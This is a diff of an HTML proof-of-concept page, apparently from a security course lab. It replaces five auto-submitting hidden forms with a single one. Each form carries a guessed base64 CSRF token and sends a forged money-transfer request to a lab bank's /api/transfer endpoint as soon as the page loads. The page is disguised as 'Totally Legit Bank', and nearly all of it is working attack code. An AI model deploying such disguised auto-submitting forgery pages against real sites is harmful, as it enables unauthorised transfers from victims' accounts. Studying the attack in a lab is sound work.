@@ -1,48 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>PhishMe Attack - Multi Token</title>
+  <meta charset="UTF-8">
+  <title>Totally Legit Bank</title>
 </head>
 <body>
 
-<!-- 多个表单，覆盖7863到7867的csrf_token -->
-<form id="f1" method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
-    <input type="hidden" name="csrf_token" value="Nzg2Mw==" /> <!-- 7863 -->
-    <input type="hidden" name="username" value="z5508657" />   <!-- 你的zID -->
-    <input type="hidden" name="amount" value="100" />
-</form>
+<h1>Totally Legit Bank Website</h1>
 
-<form id="f2" method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
-    <input type="hidden" name="csrf_token" value="Nzg2NA==" /> <!-- 7864 -->
-    <input type="hidden" name="username" value="z5508657" />
-    <input type="hidden" name="amount" value="100" />
-</form>
-
-<form id="f3" method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
-    <input type="hidden" name="csrf_token" value="Nzg2NQ==" /> <!-- 7865 -->
-    <input type="hidden" name="username" value="z5508657" />
-    <input type="hidden" name="amount" value="100" />
-</form>
-
-<form id="f4" method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
-    <input type="hidden" name="csrf_token" value="Nzg2Ng==" /> <!-- 7866 -->
-    <input type="hidden" name="username" value="z5508657" />
-    <input type="hidden" name="amount" value="100" />
-</form>
-
-<form id="f5" method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
-    <input type="hidden" name="csrf_token" value="Nzg2Nw==" /> <!-- 7867 -->
-    <input type="hidden" name="username" value="z5508657" />
-    <input type="hidden" name="amount" value="100" />
+<form method="POST" action="https://phish-me.quoccacorp.com/api/transfer" id="form">
+    <input type="hidden" name="csrf_token" value="Nzg2OA=="> <!-- 这里是你猜测的 token，比如7868 -->
+    <input type="hidden" name="username" value="z5508657">     <!-- 你的zID -->
+    <input type="hidden" name="amount" value="100">
 </form>
 
 <script>
-    document.getElementById('f1').submit();
-    document.getElementById('f2').submit();
-    document.getElementById('f3').submit();
-    document.getElementById('f4').submit();
-    document.getElementById('f5').submit();
+    document.getElementById("form").submit();
 </script>
 
 </body>
